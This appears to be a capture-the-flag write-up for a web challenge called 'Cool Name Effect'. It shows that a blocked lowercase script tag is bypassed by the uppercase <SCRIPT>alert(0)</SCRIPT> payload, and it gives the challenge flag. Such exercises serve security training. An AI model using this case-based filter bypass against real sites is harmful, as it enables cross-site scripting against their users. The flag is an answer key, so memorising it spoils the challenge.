## Cool Name Effect
```
Webmaster developed a simple script to do cool effects on your name, but his code not filtering the inputs correctly execute javascript alert and prove it.
```
- Link: http://34.77.37.110/cool-effect/


#### Solve:

- Steps

    - Trying the normal *"script"* tag doesn't work and it will be replaced by forbidden:
        ```
        <script>alert(0)</script>
        ```
    
    - Trying the *SCRIPT* tag "capital" works just fine:
        ```
        <SCRIPT>alert(0)</SCRIPT>        
        ```

> **Flag: ciyypjz**